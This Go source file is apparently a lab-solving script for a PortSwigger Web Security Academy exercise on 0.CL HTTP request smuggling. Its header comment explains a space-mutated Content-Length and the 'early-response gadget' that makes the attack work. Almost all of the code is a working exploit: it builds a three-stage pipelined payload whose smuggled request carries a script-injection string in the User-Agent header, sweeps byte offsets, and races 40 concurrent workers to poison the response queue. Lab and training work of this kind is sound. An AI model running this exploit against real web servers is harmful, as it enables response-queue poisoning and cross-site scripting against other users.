// 0.CL request smuggling
// PortSwigger Web Security Academy -- HTTP Request Smuggling
//
// Companion script for the writeup: 12-0cl-request-smuggling.md
//
// What this does -- and why it's Go, not Python:
//   0.CL is a Hidden-Visible parser discrepancy: a Content-Length header
//   mutated just enough that the front-end's parser doesn't recognize it
//   as valid ("Content-Length : 45", space before the colon), so the
//   front-end treats the request as bodyless while a more lenient back-end
//   still reads that many bytes as body. That mismatch alone deadlocks --
//   the back-end just hangs waiting for bytes that never come -- unless an
//   Early-Response Gadget (a static asset that responds before fully
//   reading the request body) breaks the standoff.
//
//   The winning pipeline is three stages sent as ONE contiguous write on
//   ONE TCP connection:
//     Stage 1: POST to the ERG with the hidden, space-mutated Content-Length.
//              The ERG responds (302/404) without reading the body.
//     Stage 2: A syntactically valid OPTIONS / whose own Content-Length
//              covers Stage 3 -- the front-end forwards it as a second,
//              separate request, but the back-end reads these bytes as
//              Stage 1's POST body (consumed by the hidden CL).
//     Stage 3: Whatever's left over after the back-end finishes reading
//              Stage 2 as body -- a genuinely new request it parses on its
//              own, carrying an XSS payload in the User-Agent header,
//              poisoning the response queue.
//
//   This has to land on the SAME back-end connection in the SAME order.
//   Python's socket writes get buffered and potentially recombined or
//   split by the OS network stack before they reach the wire as distinct
//   segments -- detection worked fine in pure Python over raw sockets, but
//   winning the race to weaponize it did not. A single conn.Write() call
//   concatenating all three stages guarantees they leave as one contiguous
//   write and land on one back-end connection, which is what actually
//   solved the lab (in 99.5 seconds, sweeping ERG/postId/hidden-CL-offset
//   combinations with TLS session caching and forced HTTP/1.1 ALPN to keep
//   reconnects fast).
//
// PortSwigger has not published a written step-by-step solution for this
// lab -- only a recorded livestream with James Kettle -- since it's
// presented as very recent published research ("HTTP/1.1 Must Die", 2025)
// rather than a settled, long-documented pattern.
//
// Usage:
//   go run 12-0cl-request-smuggling.go <lab-host>
//   e.g. go run 12-0cl-request-smuggling.go 0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net
//
// Requirements:
//   Go 1.20+, standard library only.

package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var tlsCache = tls.NewLRUClientSessionCache(500)

func newConn(host string) (*tls.Conn, error) {
	return tls.DialWithDialer(
		&net.Dialer{Timeout: 5 * time.Second},
		"tcp", host+":443",
		&tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"http/1.1"},
			ClientSessionCache: tlsCache,
		},
	)
}

// sendPipeline writes the full stage1+stage2+stage3 payload as a SINGLE
// TLS write on a single connection, guaranteeing all three stages hit the
// same back-end connection in order -- the property Python couldn't
// reliably deliver.
func sendPipeline(host string, payload []byte, readTimeout time.Duration) (string, error) {
	conn, err := newConn(host)
	if err != nil {
		return "", err
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	if _, err = conn.Write(payload); err != nil {
		return "", err
	}

	conn.SetReadDeadline(time.Now().Add(readTimeout))
	buf := make([]byte, 16384)
	n, _ := conn.Read(buf)
	return string(buf[:n]), nil
}

// sendRaw sends a single payload on its own fresh connection, used for the
// Phase 2 concurrent fallback where stage1 and stage2+3 race each other on
// separate connections instead of one pipelined write.
func sendRaw(host string, payload []byte, readTimeout time.Duration) (string, error) {
	conn, err := newConn(host)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	conn.Write(payload)
	conn.SetReadDeadline(time.Now().Add(readTimeout))
	buf := make([]byte, 8192)
	n, _ := conn.Read(buf)
	return string(buf[:n]), nil
}

func checkSolved(host string) bool {
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
	resp, err := client.Get("https://" + host + "/")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	s := strings.ToLower(string(body))
	return strings.Contains(s, "congratulations") || strings.Contains(s, "is-solved")
}

func truncate(s string, maxLen int) string {
	if len(s) > maxLen {
		return s[:maxLen]
	}
	return s
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "Usage: go run 12-0cl-request-smuggling.go <lab-host>")
		os.Exit(1)
	}
	host := os.Args[1]

	fmt.Println("[*] 0.CL Double-Desync Solver")
	fmt.Printf("[*] Host: %s\n", host)
	fmt.Println("[*] Phase 1: single-connection pipeline (primary attack)")
	fmt.Println("[*] Phase 2: concurrent fallback if Phase 1 doesn't land")

	var solved int32
	start := time.Now()

	go func() {
		for atomic.LoadInt32(&solved) == 0 {
			time.Sleep(4 * time.Second)
			if checkSolved(host) {
				fmt.Printf("\n[+] ======= LAB SOLVED! (%.1fs) =======\n", time.Since(start).Seconds())
				atomic.StoreInt32(&solved, 1)
				os.Exit(0)
			}
		}
	}()

	// Early-Response Gadgets: static assets that respond before reading the
	// request body, which is what breaks the H-V deadlock.
	ergs := []string{
		"/resources/css/labsBlog.css",
		"/resources/labheader/js/labHeader.js",
		"/resources/images/blog.svg",
		"/resources",
	}
	postIds := []string{"1", "5"}

	// ============================================================
	// PHASE 1: PIPELINE MODE
	// ============================================================
	fmt.Println("\n[*] ==================== PHASE 1: PIPELINE ====================")

	for _, erg := range ergs {
		for _, pid := range postIds {
			if atomic.LoadInt32(&solved) != 0 {
				return
			}

			// Stage 3: the complete smuggled request left over on the
			// back-end connection -- an XSS payload riding in User-Agent.
			smuggled := fmt.Sprintf(
				"GET /post?postId=%s HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"User-Agent: a\"/><script>alert(1)</script>\r\n"+
					"Content-Type: application/x-www-form-urlencoded\r\n"+
					"Content-Length: 5\r\n"+
					"\r\n"+
					"x=1", pid, host)
			smuggledLen := len(smuggled)

			// Stage 2 (chopped): OPTIONS, since the server rejects a bodied
			// GET. Its own Content-Length declares smuggledLen so the
			// front-end forwards it as a self-contained second request.
			stage2ChoppedBase := fmt.Sprintf(
				"OPTIONS / HTTP/1.1\r\nContent-Length: %d\r\nX: Y", smuggledLen)
			baseCL := len(stage2ChoppedBase)

			// Stage 2 (revealed): completes stage2 into a request the
			// front-end can parse cleanly, but whose bytes the back-end
			// consumes as Stage 1's POST body (via the hidden CL).
			stage2Revealed := fmt.Sprintf(
				"GET /hopefully404 HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"User-Agent: foo\r\n"+
					"Content-Type: application/x-www-form-urlencoded\r\n"+
					"Connection: keep-alive\r\n\r\n", host)

			fmt.Printf("\n[*] === ERG=%s postId=%s ===\n", erg, pid)
			fmt.Printf("    baseCL=%d smuggledLen=%d\n", baseCL, smuggledLen)

			// Front-ends can add headers when forwarding, shifting byte
			// alignment -- sweep the hidden CL across base..base+30.
			roundStart := time.Now()
			var logCount int64

			for offset := 0; offset <= 30; offset++ {
				if atomic.LoadInt32(&solved) != 0 {
					return
				}
				hiddenCL := baseCL + offset

				// Stage 1: POST to the ERG with the hidden, space-mutated
				// Content-Length -- "Content-Length : N", not "Content-Length: N".
				stage1 := fmt.Sprintf(
					"POST %s HTTP/1.1\r\n"+
						"Host: %s\r\n"+
						"Content-Type: application/x-www-form-urlencoded\r\n"+
						"Connection: keep-alive\r\n"+
						"Content-Length : %d\r\n\r\n", erg, host, hiddenCL)

				stage2Full := stage2ChoppedBase + stage2Revealed + smuggled
				pipelinePayload := []byte(stage1 + stage2Full)

				for attempt := 0; attempt < 10; attempt++ {
					if atomic.LoadInt32(&solved) != 0 {
						return
					}
					resp, err := sendPipeline(host, pipelinePayload, 3*time.Second)
					c := atomic.AddInt64(&logCount, 1)
					if c <= 5 {
						if err != nil {
							fmt.Printf("    [log %d] offset=%d err=%v\n", c, offset, err)
						} else {
							snippet := strings.ReplaceAll(truncate(resp, 100), "\r\n", " | ")
							fmt.Printf("    [log %d] offset=%d resp[0:100]=%s\n", c, offset, snippet)
						}
					}
				}

				if offset%5 == 0 && checkSolved(host) {
					fmt.Printf("\n[+] LAB SOLVED during pipeline sweep! offset=%d (%.1fs total)\n",
						offset, time.Since(start).Seconds())
					atomic.StoreInt32(&solved, 1)
					return
				}
			}

			fmt.Printf("    [*] Pipeline sweep for this combo done in %.1fs (%d attempts)\n",
				time.Since(roundStart).Seconds(), atomic.LoadInt64(&logCount))

			if checkSolved(host) {
				fmt.Printf("\n[+] LAB SOLVED! (%.1fs total)\n", time.Since(start).Seconds())
				atomic.StoreInt32(&solved, 1)
				return
			}
		}
	}

	// ============================================================
	// PHASE 2: CONCURRENT FALLBACK
	// ============================================================
	if atomic.LoadInt32(&solved) != 0 {
		return
	}
	fmt.Println("\n[*] ==================== PHASE 2: CONCURRENT FALLBACK ====================")

	for _, erg := range ergs {
		for _, pid := range postIds {
			if atomic.LoadInt32(&solved) != 0 {
				return
			}

			smuggled := fmt.Sprintf(
				"GET /post?postId=%s HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"User-Agent: a\"/><script>alert(1)</script>\r\n"+
					"Content-Type: application/x-www-form-urlencoded\r\n"+
					"Content-Length: 5\r\n"+
					"\r\n"+
					"x=1", pid, host)

			stage2Chopped := fmt.Sprintf(
				"OPTIONS / HTTP/1.1\r\nContent-Length: %d\r\nX: Y", len(smuggled))
			hiddenCL := len(stage2Chopped)

			stage2Revealed := fmt.Sprintf(
				"GET /hopefully404 HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"User-Agent: foo\r\n"+
					"Content-Type: application/x-www-form-urlencoded\r\n"+
					"Connection: keep-alive\r\n\r\n", host)

			stage1 := fmt.Sprintf(
				"POST %s HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"Content-Type: application/x-www-form-urlencoded\r\n"+
					"Connection: keep-alive\r\n"+
					"Content-Length : %d\r\n\r\n", erg, host, hiddenCL)

			stage2Full := stage2Chopped + stage2Revealed + smuggled

			fmt.Printf("\n[*] === concurrent ERG=%s postId=%s ===\n", erg, pid)

			var pairCount int64
			roundStart := time.Now()
			deadline := time.After(20 * time.Second)
			stop := make(chan struct{})
			sem := make(chan struct{}, 100)
			numWorkers := 40

			for w := 0; w < numWorkers; w++ {
				go func() {
					for {
						select {
						case <-stop:
							return
						default:
						}
						if atomic.LoadInt32(&solved) != 0 {
							return
						}
						var wg sync.WaitGroup
						wg.Add(2)
						go func() {
							defer wg.Done()
							sem <- struct{}{}
							defer func() { <-sem }()
							sendRaw(host, []byte(stage1), 800*time.Millisecond)
						}()
						time.Sleep(3 * time.Millisecond) // stage1 should reach the server first
						go func() {
							defer wg.Done()
							sem <- struct{}{}
							defer func() { <-sem }()
							sendRaw(host, []byte(stage2Full), 1*time.Second)
						}()
						wg.Wait()
						atomic.AddInt64(&pairCount, 1)
					}
				}()
			}

			<-deadline
			close(stop)
			time.Sleep(200 * time.Millisecond)
			fmt.Printf("    [*] Fired %d pairs in %.1fs\n",
				atomic.LoadInt64(&pairCount), time.Since(roundStart).Seconds())

			if checkSolved(host) {
				fmt.Printf("\n[+] LAB SOLVED! (%.1fs total)\n", time.Since(start).Seconds())
				atomic.StoreInt32(&solved, 1)
				return
			}
		}
	}

	if atomic.LoadInt32(&solved) == 0 {
		fmt.Println("\n[-] Not solved after both phases. Possible issues:")
		fmt.Println("    - Front-end may add headers shifting hiddenCL alignment beyond +30")
		fmt.Println("    - The ERG may not respond before reading the body on this target")
		fmt.Println("    - Try running again -- the race condition timing can vary run to run")
	}
}
